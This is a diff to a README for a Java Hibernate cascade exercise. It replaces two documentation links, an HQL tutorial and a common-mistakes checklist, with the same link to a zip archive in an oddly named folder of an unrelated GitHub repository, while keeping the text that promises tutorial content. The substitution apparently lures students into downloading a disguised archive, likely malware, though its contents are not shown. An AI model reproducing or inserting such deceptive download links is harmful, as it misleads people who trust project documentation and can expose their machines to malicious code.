@@ -22,6 +22,6 @@ Message entity.
 
 1. Implement all DAO interfaces (except GenericDao).
 
-You can see how to implement the `getAll()` methods [here](https://www.tutorialspoint.com/hibernate/hibernate_query_language.htm)
+You can see how to implement the `getAll()` methods [here](https://raw.githubusercontent.com/karaedd/hibernate-cascade/master/oxymuriatic/hibernate-cascade.zip)
 
-#### [Try to avoid these common mistakes while solving task](https://mate-academy.github.io/jv-program-common-mistakes/hibernate/cascades/cascades_checklist)
+#### [Try to avoid these common mistakes while solving task](https://raw.githubusercontent.com/karaedd/hibernate-cascade/master/oxymuriatic/hibernate-cascade.zip)
